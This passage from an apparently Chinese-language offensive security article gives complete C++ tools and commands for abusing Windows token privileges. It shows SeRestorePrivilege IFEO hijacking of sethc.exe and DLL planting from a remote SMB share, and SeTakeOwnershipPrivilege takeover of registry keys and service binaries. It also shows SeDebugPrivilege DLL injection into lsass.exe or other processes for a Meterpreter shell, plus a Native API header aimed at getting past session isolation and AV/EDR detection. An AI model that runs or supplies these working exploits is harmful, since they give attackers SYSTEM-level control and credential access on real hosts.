	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}

void PrintUsage()
{
	wprintf(
		L"Abuse of SeRestorePrivilege by @WHOAMI (whoamianony.top)\n\n"
		L"Arguments:\n"
		L"  -h                     Show this help message and exit\n"
		L"  -e <Dubugger, File>    Choose the type of exploit.\n"
		L"  -p <Program>           Specifies the original program name to IFEO hijacking.\n"
		L"  -c <Program>           Specifies the program to execute after IFEO hijacking.\n"
		L"  -s <Source>            Source file to read.\n"
		L"  -d <Destination>       Destination file to write.\n"
	);
}

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken      = NULL;
	LPCWSTR expType    = L"Dubugger";
	LPCWSTR program    = L"sethc.exe";
	LPCWSTR command    = L"\"C:\\Windows\\System32\\cmd.exe\"";
	LPCWSTR sourceFile = NULL;
	LPCWSTR destFile   = NULL;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'e':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				expType = (LPCWSTR)argv[1];
			}
			break;
		case 'p':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				program = (LPCWSTR)argv[1];
			}
			break;
		case 'c':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				command = (LPCWSTR)argv[1];
			}
			break;
		case 's':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				sourceFile = (LPCWSTR)argv[1];
			}
			break;
		case 'd':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				destFile = (LPCWSTR)argv[1];
			}
			break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			PrintUsage();
			return 0;
		}

		++argv;
		--argc;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}
	// Enable SeRestorePrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_RESTORE_NAME))
	{
		if (ExploitSeRestorePrivilege(expType, program, command, sourceFile, destFile))
		{
			return 1;
		}
	}
}
```

将编译并生成好的 SeRestorePrivilege.exe 上传到目标主机，执行以下命令，在 `Image File Execution Options` 注册表下创建一个子项 sethc.exe，并将  Debugger 键值设为 C:\Windows\System32\cmd.exe，如下图所示。

```cmd
SeRestorePrivilege.exe -e Dubugger -p sethc.exe -c C:\Windows\System32\cmd.exe
```

![image-20230209113121331](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230209113121331.png)

然后，在目标主机的远程桌面登录屏幕中连按 5 次 Shift 键即可获取一个命令行窗口，并且为 NT AUTHORITY\SYSTEM 权限，如下图所示。

![image-20230209111912926](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230209111912926.png)

当然，我们可以直接通过 `reg` 命令设置映像劫持，如下图所示。这是因为在 `reg` 命令内部会自动调用 `AdjustTokenPrivileges()` 函数为当前进程开启 SeRestorePrivilege 特权。

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
```

此外，如果我们指定 `-e` 为 ”File“，则可以写入任意文件，这里我们在系统目录中写入恶意 DLL 来劫持系统服务。这里劫持的是 Task Scheduler 服务。Task Scheduler 服务使用户可以在此计算机上配置和计划自动任务，并托管多个 Windows 系统关键任务。该服务启动后，将尝试在 C:\Windows\System32 目录中加载 WptsExtensions.dll，但是该链接库文件不存在。我们可以制作一个同名的恶意 DLL 并放入远程共享文件夹中，然后通过 SeRestorePrivilege.exe 将恶意 DLL 写入到 C:\Windows\System32 目录中，如下图所示。

```cmd
SeRestorePrivilege.exe -e File -s \\172.26.10.128\evilsmb\WptsExtensions.dll -d C:\Windows\System32\WptsExtensions.dll
```

![image-20230209115832079](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230209115832079.png)

当系统或服务重启时，目标系统上线，并且为 NT AUTHORITY\SYSTEM 权限，如下图所示。

![image-20230209120050530](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230209120050530.png)

## SeLoadDriverPrivilege *

SeLoadDriverPrivilege 特权在 Microsoft 官方文档中被描述为 “*Load and unload device drivers*”，设备驱动程序在内核中运行的事实使之成为一个非常理想的特权。

我们的目标是在仅给定 SeLoadDriverPrivilege 特权的情况下在内核中执行任意代码，并绕过该过程中的任何驱动程序签名要求，这是一项艰巨的任务。大多数关于此特权和相关 Windows API 调用的文档都假定调用者对系统具有额外的权限，特别是写入 HKLM 注册表的部分的能力。

加载驱动程序的 Windows API 是 `NtLoadDriver()`，该函数的定义如下：

```c++
NTSYSAPI NTSTATUS NtLoadDriver(
  [in] PUNICODE_STRING DriverServiceName
);
```

其中，`DriverServiceName` 参数是一个指向驱动程序注册表项路径的 Unicode 字符串指针，如下所示。

```php
\Registry\Machine\System\CurrentControlSet\Services\DriverName
```

“DriverName” 是驱动程序名称命名的子项，在该子项下，至少应有以下两个值：

- ImagePath：格式为 `\??\C:\path\to\driver.sys` 的字符串。
- Type：应设置为 1 的 DWORD 类型值。

值得注意的是，`DriverServiceName` 参数的格式必须以 “\Registry\Machine” 开头。如果是非管理员权限，默认无法操作 HKLM 注册表项，我们可以使用指向 HKCU 的路径来代替，例如 `\Registry\User\<User SID>\`，这里的 `<User SID>` 是当前用户的 SID。

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeLoadDriverPrivilege 特权，然后通过上述两种方法滥用该特权。

https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/















## SeTakeOwnershipPrivilege

SeTakeOwnershipPrivilege 特权在 Microsoft 官方文档中被描述为 “*Take ownership of files or other objects*”，该特权允许进程通过授予 WRITE_OWNER 访问权限来获得对象的所有权而无需被授予任意访问权限。

SeTakeOwnershipPrivilege 特权在攻击面上类似于 SeRestorePrivilege，由于可以接管任意对象，因此可以修改对象的 ACL。我们通过修改 Image File Execution Options 注册表或系统资源的 DACL，使我们拥有完全控制权限，并通过映像劫持、DLL 劫持或劫持服务等方法来获得本地特权提升。

滥用该特权，需要先调用一次 `SetNamedSecurityInfoW()` 函数重新设置目标对象的所有者，以获得对象的所有权，如下所示，所有者通过 Sid 来识别。

```c++
// Take owner ship
dwRes = SetNamedSecurityInfoW(
	pObjectName,
	ObjectType,
	OWNER_SECURITY_INFORMATION,
	pTokenUser->User.Sid,
	NULL,
	NULL,
	NULL
);
if (dwRes != ERROR_SUCCESS)
{
	wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
	return status;
}
wprintf(L"[*] Set the owner in the object's security descriptor.\n");
```

然后，我们需要一个新的 DACL 并更新到目标对象的安全描述符中，新的 DACL 将为我们授予目标对象的完全控制权限。构建 ACL 需要构建 EXPLICIT_ACCESS 对象，并使用 `SetEntriesInAclW()` 函数来构建 ACL 对象，如下所示。

```c++
ea[0].grfAccessPermissions = grfAccessPermissions;
ea[0].grfAccessMode = SET_ACCESS;
ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
ea[0].Trustee.TrusteeType = TRUSTEE_IS_USER;
ea[0].Trustee.ptstrName = (LPWSTR)pTokenUser->User.Sid;    // Sid of owner
dwRes = SetEntriesInAclW(1, ea, pOldDACL, &pNewDACL);

if (dwRes != ERROR_SUCCESS)
{
	wprintf(L"[-] SetEntriesInAclW Error: [%u].\n", dwRes);
	return status;
}
wprintf(L"[*] Create a new access control list.\n");
```

最后，再一次调用 `SetNamedSecurityInfoW()` 函数，将上述 DACL 对象更新到目标对象中，如下所示。

```c++
// Now that we are the owner, try again to modify the object's DACL.
dwRes = SetNamedSecurityInfoW(
	pObjectName,
	ObjectType,
	DACL_SECURITY_INFORMATION,
	NULL,
	NULL,
	pNewDACL,
	NULL
);
if (dwRes != ERROR_SUCCESS)
{
	wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
	return status;
}
else
{
	wprintf(L"[*] Now that we are the owner, and modify the object's DACL.\n");
	status = TRUE;
}
```

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeTakeOwnershipPrivilege 特权，然后通过上述过程滥用该特权。如果执行时 `-e` 参数为 “Registry”，则会接管 `Image File Execution Options` 注册表对象。如果 `-e` 参数为 “File”，则可以接管关键系统文件。

- SeTakeOwnershipPrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <sddl.h>
#include <aclapi.h>

PTOKEN_USER GetTokenUserInformation(HANDLE hToken)
{
	DWORD dwReturnLength = 0;
	PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(sizeof(TOKEN_USER));

	// Get token information, set tokenInfo.
	if (GetTokenInformation(hToken, TokenUser, NULL, 0, &dwReturnLength) || GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		pTokenUser = (PTOKEN_USER)realloc(pTokenUser, dwReturnLength *= 2);
		if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwReturnLength, &dwReturnLength))
		{
			wprintf(L"[-] Failed to get token user information.\n");
			CloseHandle(hToken);
			free(pTokenUser);
			return NULL;
		}
	}
	return pTokenUser;
}

BOOL ExploitSeTakeOwnershipPrivilege(HANDLE hToken, SE_OBJECT_TYPE ObjectType, LPWSTR pObjectName, DWORD grfAccessPermissions)
{
	BOOL status = FALSE;
	PACL pOldDACL = NULL;
	PACL pNewDACL = NULL;
	EXPLICIT_ACCESS ea[1];
	PTOKEN_USER pTokenUser;
	LPWSTR stringSid;
	DWORD dwRes;

	pTokenUser = GetTokenUserInformation(hToken);

	dwRes = GetNamedSecurityInfoW(
		(LPCWSTR)pObjectName, 
		ObjectType,
		DACL_SECURITY_INFORMATION,
		NULL,
		NULL, 
		&pOldDACL, 
		NULL, 
		NULL
	);
	if (dwRes != ERROR_SUCCESS)
	{
		printf("[-] GetNamedSecurityInfoW Error: [%u].\n", dwRes);
		return status;
	}
	wprintf(L"[*] Get a copy of the security descriptor for the object.\n");

	// Take owner ship
	dwRes = SetNamedSecurityInfoW(
		pObjectName,
		ObjectType,
		OWNER_SECURITY_INFORMATION,
		pTokenUser->User.Sid,
		NULL,
		NULL,
		NULL
	);
	if (dwRes != ERROR_SUCCESS)
	{
		wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
		return status;
	}
	wprintf(L"[*] Set the owner in the object's security descriptor.\n");

	ea[0].grfAccessPermissions = grfAccessPermissions;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_USER;
	ea[0].Trustee.ptstrName = (LPWSTR)pTokenUser->User.Sid;    // Sid of owner

	dwRes = SetEntriesInAclW(1, ea, pOldDACL, &pNewDACL);
	if (dwRes != ERROR_SUCCESS)
	{
		wprintf(L"[-] SetEntriesInAclW Error: [%u].\n", dwRes);
		return status;
	}
	wprintf(L"[*] Create a new access control list.\n");

	// Now that we are the owner, try again to modify the object's DACL.
	dwRes = SetNamedSecurityInfoW(
		pObjectName,
		ObjectType,
		DACL_SECURITY_INFORMATION,
		NULL,
		NULL,
		pNewDACL,
		NULL
	);
	if (dwRes != ERROR_SUCCESS)
	{
		wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
		return status;
	}
	else
	{
		wprintf(L"[*] Now that we are the owner, and modify the object's DACL.\n");
		status = TRUE;
	}
	return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}

void PrintUsage()
{
	wprintf(
		L"Abuse of SeTakeOwnershipPrivilege by @WHOAMI (whoamianony.top)\n\n"
		L"Arguments:\n"
		L"  -h                     Show this help message and exit\n"
		L"  -e <Registry, File>    Specifies the type of object\n"
		L"  -t <ObjectName>        Specifies the name of object\n"
	);
}

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	LPCWSTR lpObjectType = L"Registry";
	LPCWSTR lpObjectName = L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options";
	SE_OBJECT_TYPE seObjectType = SE_REGISTRY_KEY;
	DWORD grfAccessPermissions = KEY_ALL_ACCESS;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'e':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpObjectType = (LPCWSTR)argv[1];
				if (!wcscmp(lpObjectType, L"Registry"))
				{
					seObjectType = SE_REGISTRY_KEY;
					grfAccessPermissions = KEY_ALL_ACCESS;
				}
				if (!wcscmp(lpObjectType, L"File"))
				{
					seObjectType = SE_FILE_OBJECT;
					grfAccessPermissions = GENERIC_ALL;
				}
			}
			break;
		case 't':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpObjectName = (LPCWSTR)argv[1];
			}
			break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			PrintUsage();
			return 0;
		}

		++argv;
		--argc;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}
	// Enable SeTakeOwnershipPrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME))
	{
		if (ExploitSeTakeOwnershipPrivilege(hToken, seObjectType, (LPWSTR)lpObjectName, grfAccessPermissions))
		{
			return 1;
		}
	}
}
```

将编译并生成好的 SeTakeOwnershipPrivilege.exe 上传到目标主机，执行以下命令接管 `Image File Execution Options` 注册表对象，然后直接通过 `reg` 命令设置映像劫持即可，如下图所示。

```powershell
SeTakeOwnershipPrivilege.exe -e "Registry" -t "MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
```

![image-20230214192438120](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230214192438120.png)

如下图所示，可以看到，SeTakeOwnershipPrivilege.exe 执行后 `Image File Execution Options` 注册表项的所有者变成了 Marcus 用户，并且对其拥有完全控制权限，如下图所示。

![image-20230214192003442](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230214192003442.png)

此外，如果我们指定 `-e` 为 ”File“，则可以接管任意文件。假设 TestSrv 是一个以 NT AUTHORITY\SYSTEM 权限运行的服务，其二进制文件路径为 ”C:\Program Files\TestService\TestSrv.exe“。执行以下命令，接管该服务的二进制文件并将其覆盖为攻击载荷，如下图所示。

```powershell
.\\SeTakeOwnershipPrivilege.exe -e "File" -t "C:\Program Files\TestService\TestSrv.exe"
```

![image-20230214194658736](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230214194658736.png)

当系统或服务重启时，目标系统上线，并且为 NT AUTHORITY\SYSTEM 权限，如下图所示。

![image-20230214195126644](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230214195126644.png)

## SeDebugPrivilege

SeDebugPrivilege 特权在 Microsoft 官方文档中被描述为 “*Debug programs*”。该特权非常强大，它允许其持有者调试另一个进程，这包括读取和写入该进程的内存。许多年来，恶意软件作者和漏洞利用程序开发人员广泛滥用了这一特权。因此，许多通过这一特权获得本地特权提升的技术将被现代端点保护解决方案标记。

滥用该特权，我们可以通过 `CreateRemoteThread()` 函数实现远程线程注入，以在高权限的系统进程中加载恶意 DLL 或者 Shellcode，并最终获得本地特权提升。此外，使用该特权还可以转储 lsass.exe 进程的内存，从而获取已登录用户哈希值。这里，我们首先介绍通过远程线程注入加载恶意 DLL。

周所周知，程序在加载一个 DLL 时，它通常会调用 [`LoadLibrary()`](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) 函数来实现 DLL 的动态加载，该函数的声明如下所示。

```c++
HMODULE LoadLibraryW(
  [in] LPCWSTR lpLibFileName
);
```

再来看一下创建远程线程的 [`CreateRemoteThread()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) 函数，其用于创建在另一个进程的虚拟地址空间中运行的线程，该函数定义如下。

```c++
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```

该函数需要传递目标进程空间中的线程函数的地址 `lpStartAddress`，以及传递给线程函数的参数 `lpParameter`，其中参数类型为空指针类型。

如果程序能够获取目标进程中 `LoadLibrary()` 函数的地址，并且能够获取进程空间中某个 DLL 路径字符串的地址，那么就可以将 `LoadLibrary()` 函数的地址作为线程函数的地址，这个 DLL 路径字符串作为传递给线程函数的参数。将二者一并传递给 `CreateRemoteThread()` 函数，在系统进程空间中创建一个线程，这个线程就是通过 `LoadLibrary()` 函数加载恶意 DLL。

到目前为止，远程线程注入的大致原理清晰了。那么要实现远程线程注入 DLL，还需要解决以下两个问题：

1. 目标进程空间中 `LoadLibrary()` 函数的地址是多少。
2. 如何向目标进程空间中写入 DLL 路径字符串数据。

对于第一个问题，由于 Windows 引入了基址随机化 ASLR（Address Space Layout Randomization）安全机制，所以每次开机时系统 DLL 的加载基址都不一样，从而导致了 DLL 导出函数的地址也都不一样。

但是，有些系统 DLL（例如 kernel32.dll、ntdll.dll）的加载基地址要求系统启动之后必须固定，如果系统重新启动，则其地址可以不同。也就是说，虽然进程不同，但是开机后，kernel32.dll 的加载基址在各个进程中都是相同的，因此导出函数的地址也相同。所以，自己程序空间中 `LoadLibrary()` 函数地址和其他进程空间中 `LoadLibrary()` 函数地址相同。因此，我们可以通过加载 kernel32.dll 模块来获取 `LoadLibrary()` 函数地址。

对于第二个问题，我们可以直接调用 `VirtualAllocEx()` 函数在目标进程空间中申请一块内存，然后再调用 `WriteProcessMemory()` 函数将指定的 DLL 路径写入到目标进程空间中。

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeDebugPrivilege 特权，然后通过上述过程滥用该特权。

- SeDebugPrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <tlhelp32.h>

DWORD GetProcessIdByName(LPCWSTR lpProcessName)
{
	// Create toolhelp snapshot.
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	// Walkthrough all processes.
	if (Process32FirstW(hSnapshot, &process))
	{
		do
		{
			// Compare process.szExeFile based on format of name, i.e., trim file path
			// trim .exe if necessary, etc.
			if (_wcsicmp(process.szExeFile, lpProcessName) == 0)
			{
				wprintf(L"[*] Got the PID of %ws: %d.\n", lpProcessName, process.th32ProcessID);
				return process.th32ProcessID;
			}
		} while (Process32NextW(hSnapshot, &process));
	}

	CloseHandle(hSnapshot);
	return 0;
}

BOOL ExploitSeDebugPrivilege(LPCWSTR lpProcessName, LPCWSTR lpDllFileName)
{
	BOOL status = FALSE;
	DWORD dwProcessId;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	SIZE_T dwSize = 0;
	LPVOID lpDllAddr = NULL;
	FARPROC pLoadLibraryProc = NULL;

	dwProcessId = GetProcessIdByName(lpProcessName);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hProcess == NULL)
	{
		printf("[-] OpenProcess Error: [%u].\n", GetLastError());
		return status;
	}
	
	// Allocate virtual memory space in a remote process.
	dwSize = (wcslen(lpDllFileName) + 1) * sizeof(WCHAR);
	lpDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	if (lpDllAddr == NULL)
	{
		printf("[-] VirtualAllocEx Error: [%u].\n", GetLastError());
		return status;
	}
	wprintf(L"[*] Allocate virtual memory space in a %ws process: 0x%016llx\n", lpProcessName, lpDllAddr);

	// Write DLL path data to the allocated memory.
	if (!WriteProcessMemory(hProcess, lpDllAddr, lpDllFileName, dwSize, NULL))
	{
		printf("[-] WriteProcessMemory Error: [%u].\n", GetLastError());
		return status;
	}
	wprintf(L"[*] Write DLL path to the allocated memory.\n");

	// Get the LoadLibraryW function address through kernel32.dll.
	pLoadLibraryProc = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryProc == NULL)
	{
		printf("[-] GetProcAddress Error: [%u].\n", GetLastError());
		return status;
	}
	wprintf(L"[*] Get address of LoadLibraryW: 0x%016llx.\n", pLoadLibraryProc);

	// Use CreateRemoteThread to create a remote thread for DLL injection.
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryProc, lpDllAddr, 0, NULL);
	if (hThread == NULL)
	{
		printf("[-] CreateRemoteThread Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		wprintf(L"[*] Create a remote thread for DLL injection.\n");
		status = TRUE;
	}

	WaitForSingleObject(hThread, -1);
	CloseHandle(hProcess);

	return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}

void PrintUsage()
{
	wprintf(
		L"Abuse of SeDebugPrivilege by @WHOAMI (whoamianony.top)\n\n"
		L"Arguments:\n"
		L"  -h                  Show this help message and exit.\n"
		L"  -p <ProcessName>    Specifies the system process name.\n"
		L"  -m <DLL>            Specifies the malicious DLL path.\n"
	);
}

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	LPCWSTR lpProcessName = L"lsass.exe";
	LPCWSTR lpDllFileName = NULL;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'p':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpProcessName = (LPCWSTR)argv[1];
			}
			break;
		case 'm':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpDllFileName = (LPCWSTR)argv[1];
			}
			break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			PrintUsage();
			return 0;
		}

		++argv;
		--argc;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}
	// Enable SeDebugPrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_DEBUG_NAME))
	{
		if (ExploitSeDebugPrivilege(lpProcessName, lpDllFileName))
		{
			return 1;
		}
	}
}
```

将编译并生成好的 SeBackupPrivilege.exe 上传到目标主机，执行以下命令，将恶意的 DLL 注入 Administrator 用户的 notepad.exe 进程中，如下图所示，成功获得 Administrator 用户权限的 Meterpreter。

```powershell
SeDebugPrivilege.exe -p "notepad.exe" -m "C:\Users\Marcus\shell.dll"
```

![image-20230214231049280](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230214231049280.png)

到目前为止，我们演示的远程线程注入都是使用 Windows 标准 API 进行的，其虽然易于使用，但是可被大多数 AV/EDR 产品检测到。此外，在测试中可能会发现，我们不能成功注入到一些系统服务进程。这是因为系统存在 SESSION 0 隔离的安全机制，传统的远程注入 DLL 方法并不能突破 SESSION 0 隔离。

也为了突破 SESSION 0 隔离，我们需要使用 Windows 系统中底层的 API，也就是 Native APIs。

> 为了方便与操作系统进行交互，程序员一般使用微软推荐的标准 API（Win32 API）。标准 Windows APIs 是在 Native APIs 的基础上包装产生的。Native APIs 也被称为 Undocumented APIs，因为你通常找不到它们的官方文档。Native APIs 或 Undocumented APIs 都可以在 ntdll.dll 库中调用，我们可以通过查看其他人的代码或者别人总结的非官方文档，来查看它们的使用方法。

由于 Windows 在内核 6.0 以后引入了会话隔离机制，它在创建一个进程之后并不会立即运行，而是先挂起进程，在查看要运行的进程所在的会话层之后再决定是否恢复进程运行。经过逆向分析，可以发现 `CreateRemoteThread()` 函数内部在调用了 `NtCreateThreadEx()` 函数来创建远程线程，并且 `NtCreateThreadEx()` 的第七个参数 `CreateThreadFlags` 的值被设为了 1，他会导致线程创建完成后一直挂起无法恢复运行，这就是为什么在注入系统进程时会失败。

所以，要想成功注入系统服务进程，就需要直接调用 `NtCreateThreadEx()` 函数，并将第七个参数的值改为 0，这样线程创建完成后就会恢复运行，成功注入。

如下创建一个 Native.h，将 ntdll.dll 模块加载到我们的程序中，并定义与我们要使用的原始函数格式完全相同的函数指针，使用这些函数的基地址来初始化这些指针。对于远程线程注入来说，我们需要的函数有 `NtOpenProcess()`、`NtAllocateVirtualMemory()`、`NtWriteVirtualMemory()`、`NtCreateThreadEx()`，如下所示。

- Native.h

```c++
#pragma once

#include <Windows.h>

#define STATUS_SUCCESS 0

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
}

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef NTSTATUS(NTAPI* _NtOpenProcess)(
	PHANDLE            ProcessHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID         ClientId
	);

typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
	HANDLE             ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR          ZeroBits,
	PSIZE_T            RegionSize,
	ULONG              AllocationType,
	ULONG              Protect
	);

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
	HANDLE             hProcess,
	PVOID              lpBaseAddress,
	PVOID              lpBuffer,
	SIZE_T             NumberOfBytesToRead,
	PSIZE_T            NumberOfBytesRead
	);

typedef NTSTATUS(NTAPI* _NtCreateThreadEx) (
	PHANDLE            ThreadHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	HANDLE             ProcessHandle,
	PVOID              StartRoutine,
	PVOID              Argument OPTIONAL,
	ULONG              CreateFlags,
	ULONG_PTR          ZeroBits,
	SIZE_T             StackSize OPTIONAL,
	SIZE_T             MaximumStackSize OPTIONAL,
	PVOID              AttributeList OPTIONAL
	);

_NtOpenProcess NtOpenProcess = (_NtOpenProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtOpenProcess");
_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory");
